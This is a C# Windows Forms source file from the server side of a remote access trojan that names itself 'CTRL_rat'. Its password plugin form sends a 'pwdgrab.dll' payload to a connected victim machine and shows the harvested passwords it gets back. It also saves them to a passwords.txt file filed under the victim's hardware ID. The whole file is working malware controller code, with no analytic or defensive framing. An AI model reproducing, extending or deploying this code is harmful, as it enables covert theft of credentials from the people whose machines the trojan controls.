using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CTRL_rat_Server;
using System.Windows.Forms;
using System.IO;

namespace Server_plugin_dll
{
    public partial class pwd : Form
    {
        node client;
        CTRL_rat_Server.Main parent;
        string passwd = "";
        public pwd(node _client, CTRL_rat_Server.Main _parent)
        {
            client = _client;
            parent = _parent;
            InitializeComponent();
            richTextBox1.ReadOnly = true;
        }
        public void OnMessage(node _client, Dictionary<object, object> response) 
        {
            if ((string)response["op"] == "retpwd" && _client.hwid==client.hwid)
            {
                string passwords = (string)response["data"];
                richTextBox1.Invoke((MethodInvoker)(() =>
                {
                    richTextBox1.Text = passwords;
                    passwd = passwords;
                }));
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string clientdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Client");
            string serverdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Server");
            var g = client.get_or_create_worker_node(client.generate_random_id());
            //parent.Send_and_load_dll(g, File.ReadAllBytes(Path.Combine(clientdlldir, "test.dll")));
            var payload = new Dictionary<object, object>();
            payload["op"] = "grabpwd";
            payload["data"] = File.ReadAllBytes(Path.Combine(clientdlldir, "pwdgrab.dll"));
            g.Send(g.sock, Encoding.UTF8.GetBytes(g.DictionaryToJson(payload)));
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string savepth = Path.Combine(Directory.GetCurrentDirectory(), client.hwid,"passwords.txt");
            System.IO.Directory.CreateDirectory(Path.Combine(Directory.GetCurrentDirectory(), client.hwid));
            File.WriteAllText(savepth, passwd);
        }
    }
}
